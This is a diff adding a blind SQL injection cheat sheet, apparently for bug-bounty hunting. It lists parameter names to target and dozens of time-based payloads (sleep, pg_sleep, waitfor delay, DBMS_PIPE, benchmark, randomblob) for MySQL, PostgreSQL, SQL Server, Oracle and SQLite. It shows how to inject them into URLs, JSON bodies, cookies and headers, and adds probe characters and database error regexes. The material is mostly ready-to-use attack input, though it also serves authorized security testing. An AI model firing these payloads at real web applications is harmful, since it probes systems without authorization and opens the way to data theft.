@@ -1,0 +1,459 @@
+#Blind Sql Injection detection Cheatsheet (Ansar Uddin)
+
+Time Based (GET,POST)
+
+Apply on:
+
+Search box
+Email or Password input function (login or reset password)
+Any kind of Product purchase,menu,keyword
+Cookie,User agent,Refera
+
+If you want to get unique parameter.
+
+Use this extension for burpsuite:
+https://github.com/PortSwigger/js-link-finder
+
+
+Parameter list (regular):
+id
+cid
+pid
+page
+search
+dir
+category
+class
+file
+news
+item
+menu
+lang
+name
+ref
+title
+view
+topic
+thread
+type
+date
+form
+join
+main
+nav
+region
+id
+select
+report
+role
+update
+query
+user
+sort
+where
+params
+process
+row
+table
+from
+results
+sleep
+fetch
+order
+keyword
+column
+field
+delete
+string
+number
+filter
+
+
+Payload list:
+
+Mysql Blind
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
+if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/
+if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
+if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
+%2c(select%5*%5from%5(select(sleep(5)))a)
+(select(0)from(select(sleep(5)))v)
+'%2b(select*from(select(sleep(5)))a)%2b'
+(select*from(select(sleep(5)))a)
+1'%2b(select*from(select(sleep(5)))a)%2b'
+,(select * from (select(sleep(5)))a)
+desc%2c(select*from(select(sleep(5)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
+(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f
+(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/
+
+
+1 AND (SELECT 4796 FROM (SELECT(SLEEP(5)))HmFD)       
+1 AND (SELECT 4796 FROM (SELECT(SLEEP(5)))HmFD) AND (7371=7371
+1 AND (SELECT 4796 FROM (SELECT(SLEEP(5)))HmFD)-- MKBR
+1' AND (SELECT 4796 FROM (SELECT(SLEEP(5)))HmFD) AND 'CuSY'='CuSY
+1') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))HmFD) AND ('PBiy'='PBiy
+
+1 and sleep 5--
+1 and sleep 5
+1 and sleep(5)--
+1 and sleep(5)
+1 SELECT SLEEP(5); #
+and sleep 5--
+and sleep 5
+and sleep(5)--
+and sleep(5)
+and SELECT SLEEP(5); #
+or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT SLEEP(5); #
+";sleep 5--
+";sleep 5
+";sleep(5)--
+";sleep(5)
+";SELECT SLEEP(5); #
+(select*from(select(sleep(5)))a)
+(sleep 5)--
+(sleep 5)
+(sleep(5))--
+(sleep(5))
+(SELECT SLEEP(5))
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
++ SLEEP(5) + '
+SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
+
+
+
+Postgresql Blind:
+
+
+";SELECT pg_sleep(5);
+and SELECT pg_sleep(5);
+1 SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+
+1 AND 9074=(SELECT 9074 FROM PG_SLEEP(5))
+1 AND 9074=(SELECT 9074 FROM PG_SLEEP(5))-- HDbe
+1' AND 9074=(SELECT 9074 FROM PG_SLEEP(5)) AND 'ojXu'='ojXu
+1') AND 9074=(SELECT 9074 FROM PG_SLEEP(5)) AND ('XFZS'='XFZS
+1) AND 9074=(SELECT 9074 FROM PG_SLEEP(5)) AND (3074=3074
+
+
+
+Microsoft SQL Server Blind:
+
+;waitfor delay '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+") IF (1=1) WAITFOR DELAY '0:0:5'--
+';%5waitfor%5delay%5'0:0:5'%5--%5
+1 WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'
+1 WAITFOR DELAY '0:0:5'-- LnoF
+1' WAITFOR DELAY '0:0:5' AND 'VrGF'='VrGF
+1') WAITFOR DELAY '0:0:5' AND ('psNh'='psNh
+1) WAITFOR DELAY '0:0:5' AND (6165=6165
+
+
+Oracle Blind:
+
+1 AND 8573=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
+1 AND 8573=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- yESM
+1' AND 8573=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND 'YbfD'='YbfD
+1') AND 8573=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('tHnJ'='tHnJ
+1) AND 8573=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (4992=4992
+
+
+
+Exploitation :
+
+1.=payload
+
+
+Example:
+
+=0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+
+=(select(0)from(select(sleep(5)))v)
+
+email=test@gmail.com' WAITFOR DELAY '0:0:5'--
+
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+
+2.=value payload
+
+Example:
+
+=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+
+=1'XOR(if(now()=sysdate(),sleep(5),0))OR'
+
+=1 AND (SELECT 4796 FROM (SELECT(SLEEP(5)))HmFD)-- MKBR
+    
+=1 or sleep(5)#
+
+
+3.https://redact.com/page/payload
+https://redact.com/page/value payload 
+https://redact.com/page/valuepayload
+
+
+Example:
+
+https://redact.com/page/if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
+
+https://redact.com/(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
+
+https://redact.com/page/1 AnD SLEEP(5)
+
+https://redact.com/page/1' ORDER BY SLEEP(5)
+
+
+
+4.Blind sql injection in json
+
+{payload}
+
+[payload]
+
+{value payload}
+
+{valuepayload}
+
+
+Example:
+
+[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]
+
+{AnD SLEEP(5)}
+
+{1 AnD SLEEP(5)}
+
+{1' AnD SLEEP(5)--}
+
+"emails":["AnD SLEEP(5)"]
+
+{"options":{"id":[],"emails":["AnD SLEEP(5)"],
+
+
+
+
+
+5.Http header based:
+
+Referer: https://https://redact.com/408685756payload
+
+
+Cookie: _gcl_au=1.1.2127391584.1587087463paylaod
+
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87Payload
+
+
+or 
+
+Referer: https://https://redact.com/408685756 payload
+
+
+Cookie: _gcl_au=1.1.2127391584.1587087463 paylaod
+
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Payload
+
+X-Forwarded-For: paylaod
+
+
+
+
+6.Sql detection query for always test
+
+query:
+
+'
+"
+'"
+.
+/
+\
+%5c
+%27
+)
+")
+')
+))
+"))
+'))
+#
+;
+''
+`
+``
+,
+""
+//
+\\
+%
+%00
+||
+
+Detection source
+
+["SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", "MySqlClient\."]
+["PostgreSQL.*ERROR", "Warning.*\Wpg_.*", "valid PostgreSQL result", "Npgsql\."]
+["Driver.* SQL[\-\_\ ]*Server", "OLE DB.* SQL Server", "(\W|\A)SQL Server.*Driver", "Warning.*mssql_.*", "(\W|\A)SQL Server.*[0-9a-fA-F]{8}", "(?s)Exception.*\WSystem\.Data\.SqlClient\.", "(?s)Exception.*\WRoadhouse\.Cms\."]
+["Microsoft Access Driver", "JET Database Engine", "Access Database Engine"]
+["\bORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*Driver", "Warning.*\Woci_.*", "Warning.*\Wora_.*"]
+["CLI Driver.*DB2", "DB2 SQL error", "\bdb2_\w+\("]
+["SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException", "Warning.*sqlite_.*", "Warning.*SQLite3::", "\[SQLITE_ERROR\]"]
+["(?i)Warning.*sybase.*", "Sybase message", "Sybase.*Server message.*"]
+
+
+7.Generic Time Based SQL Injection Payloads
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+'\"
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
+' AnD SLEEP(5) ANd '1
+'&&SLEEP(5)&&'1
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+RANDOMBLOB(500000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+RANDOMBLOB(1000000000/2)
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+-sleep(5)
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(1))A))
+AND (SELECT 1223 FROM (SELECT(SLEEP(10)))yuPW)-- Czbn
+OR (SELECT 1223 FROM (SELECT(SLEEP(10)))yuPW)-- Czbn
+
+
